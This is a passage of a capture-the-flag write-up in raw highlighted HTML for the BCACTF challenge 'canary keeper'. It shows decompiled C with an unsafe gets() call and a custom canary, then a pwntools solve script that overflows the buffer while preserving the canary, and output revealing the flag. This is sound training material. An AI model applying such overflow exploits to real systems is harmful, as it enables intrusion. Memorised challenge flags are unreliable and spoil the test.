style=\"color:#24292EFF;--shiki-dark:#C5E478\">process\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 39665\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) exited with code 046]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"canary-keeper\">canary keeper\u003C/h3>\n\u003Cblockquote>\n\u003Cp>My friend gave me this executable, but it keeps giving me errors. Can you get the flag?\u003C/p>\n\u003C/blockquote>\n\u003Cp>Based on the title, the solution for this problem is to bypass the “canary”, which is basically an alarm that will close a program once it detects a buffer overflow.\u003C/p>\n\u003Cp>Let’s look at the code:\u003C/p>\n\u003Cp>(binary ninja)\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int32_t\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> main\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int32_t\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> argc\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> char\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">**\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> argv\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> char\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">**\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> envp\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    int64_t\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> var_48;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    __builtin_strncpy\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">&#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">var_48\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">FLAG\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#FFEB95\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">40\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    int32_t\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> var_4f;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    __builtin_strncpy\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">&#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">var_4f\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">canary\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 7\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Enter a string: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    void\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> buf;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    gets\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">&#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">buf)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    int32_t\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> rax_3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">check_canary\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">&#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">var_4f)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ==\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">        puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Buffer overflow detected!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        rax_3 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    else\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">check_flag\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">&#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">var_48)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ==\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">        printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Flag: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">FLAG\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        rax_3 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    else\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">        puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">No changes in flag detected!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        rax_3 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> rax_3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So as we can see that the input size is 73, and that there is a custom canary coded. What we can do with this is to overflow the binary, but append the canary so that it passes the check.\u003C/p>\n\u003Cp>Here’s our tactic:\u003C/p>\n\u003Col>\n\u003Cli>Input 73 A’s and append the binary string “canary”\u003C/li>\n\u003Cli>Add a four character anything. I’ll just use flag\u003C/li>\n\u003Cli>Get the flag.\u003C/li>\n\u003C/ol>\n\u003Cp>Unfortunately I didn’t realize that you had to use null bytes in order to allow the canary to bypas the check with data after it. Two days to realize that.\u003C/p>\n\u003Cp>So here’s the solve script:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwn \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwn \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> p64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">elf \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> ELF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">./provided\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">its 73 space in the input(?)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> args\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">REMOTE\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    r \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> remote\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">challs.bcactf.com\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 32101\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    r \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> process\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">elf.path\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">A\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">73\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">does the canary check(?)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">canary\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x00\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">flag\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">payload += p64(0x63616e617279)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">r\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sendline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">r.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">recvall\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>And we get the flag.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/home/jake/bcactf/canary/provided\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    Arch:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">     amd64-64-little\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    RELRO:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">    Full\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> RELRO\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    Stack:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">    No\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> canary\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> found\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    NX:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">       NX\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> enabled\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    PIE:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">      PIE\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> enabled\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[+] Opening connection to challs.bcactf.com on port 32101: Done\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">b\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcanary\\x00flag'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[+] Receiving all data: Done (\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">58B\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] Closed connection to challs.bcactf.com port 32101\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">b\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">'Enter a string: Flag: bcactf{s1mple_CANaRY_9b36bd9f3fd2f}\\n'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">jake@edgygamer:~/bcactf/canary$\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> \u003C/span>\u003C/span>\n\u003Cspan 